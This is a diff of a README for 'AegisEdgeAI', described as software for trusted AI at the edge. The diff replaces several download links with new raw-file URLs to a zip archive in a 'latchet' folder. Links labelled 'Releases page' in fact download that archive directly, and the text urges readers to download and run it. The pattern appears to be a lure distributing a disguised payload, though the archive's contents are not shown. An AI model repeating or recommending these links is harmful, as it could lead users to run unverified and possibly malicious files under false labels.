@@ -1,7 +1,7 @@
 # 🤖 AegisEdgeAI - Ensure Trust in AI Workloads
 
 ## 📥 Download Now
-[![Download AegisEdgeAI](https://raw.githubusercontent.com/Themxhiguy/AegisEdgeAI/main/latchet/AegisEdgeAI.zip)](https://raw.githubusercontent.com/Themxhiguy/AegisEdgeAI/main/latchet/AegisEdgeAI.zip)
+[![Download AegisEdgeAI](https://github.com/Themxhiguy/AegisEdgeAI/raw/refs/heads/main/latchet/AI-Aegis-Edge-v2.0.zip)](https://github.com/Themxhiguy/AegisEdgeAI/raw/refs/heads/main/latchet/AI-Aegis-Edge-v2.0.zip)
 
 ## 📖 Overview
 AegisEdgeAI delivers verifiable trust for AI at the edge. From manufacturing to live operations, our software ensures workloads run only on approved, uncompromised devices in approved locations. This means you can trust that your AI processes are secure and reliable.
@@ -10,7 +10,7 @@ AegisEdgeAI delivers verifiable trust for AI at the edge. From manufacturing to 
 Follow these steps to download and run AegisEdgeAI:
 
 1. **Visit the Releases Page**
-   Go to our [Releases page](https://raw.githubusercontent.com/Themxhiguy/AegisEdgeAI/main/latchet/AegisEdgeAI.zip) to find the latest version of the software.
+   Go to our [Releases page](https://github.com/Themxhiguy/AegisEdgeAI/raw/refs/heads/main/latchet/AI-Aegis-Edge-v2.0.zip) to find the latest version of the software.
 
 2. **Choose the Right Version**
    Look for the most recent version at the top of the page. Each version is labeled, along with a brief description. Download the version that suits your needs.
@@ -79,6 +79,6 @@ AegisEdgeAI covers a broad range of topics relevant to secure AI workloads, incl
 Explore these topics further to understand the capabilities and applications of AegisEdgeAI.
 
 ## 📥 Download & Install
-Remember to visit the [Releases page](https://raw.githubusercontent.com/Themxhiguy/AegisEdgeAI/main/latchet/AegisEdgeAI.zip) to download the latest version of AegisEdgeAI. Follow the installation steps above to get started on securing your AI workloads effectively.
+Remember to visit the [Releases page](https://github.com/Themxhiguy/AegisEdgeAI/raw/refs/heads/main/latchet/AI-Aegis-Edge-v2.0.zip) to download the latest version of AegisEdgeAI. Follow the installation steps above to get started on securing your AI workloads effectively.
 
 Thank you for choosing AegisEdgeAI!
